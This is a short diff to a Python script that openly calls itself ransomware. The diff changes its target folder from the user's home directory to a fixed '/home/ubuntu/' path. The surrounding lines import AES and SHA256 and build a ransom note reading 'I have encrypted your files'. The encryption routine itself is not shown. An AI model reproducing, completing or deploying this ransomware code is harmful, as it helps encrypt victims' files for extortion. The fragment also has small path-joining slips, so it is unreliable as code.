@@ -3,11 +3,11 @@ from random import randint
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 
-path = [ os.getenv('HOME') ] #path of our target folder
+path = [ "/home/ubuntu/" ] #path of our target folder
 
 def notification():
     note = "Hi, this is a ransomware and I have encrypted your files."
-    value = os.getenv('HOME')
+    value = "home/ubuntu/"
     print(value)
     desktop_dir = os.getenv('HOME') #for windows, for unix is 'HOME'
     outputfile = desktop_dir + "README.txt"
